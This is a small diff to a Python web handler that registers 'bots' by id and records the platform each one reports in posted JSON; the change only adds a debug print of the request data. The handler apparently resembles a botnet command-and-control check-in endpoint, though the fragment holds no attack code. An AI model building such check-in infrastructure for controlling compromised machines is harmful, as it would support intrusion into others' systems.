@@ -31,6 +31,7 @@ def get_status(bot_id):
 	if not bot:							#if doesnt exist then create new bot obj and add to db (new bot)
 		bot = Bot(bot_id)				
 	info = request.get_json()					#api call by post with json obj, update the db with the json obj
+	print(info);
 	if info:							#updates bot info each time 
 		if 'platform' in info:
 			bot.os = info['platform']
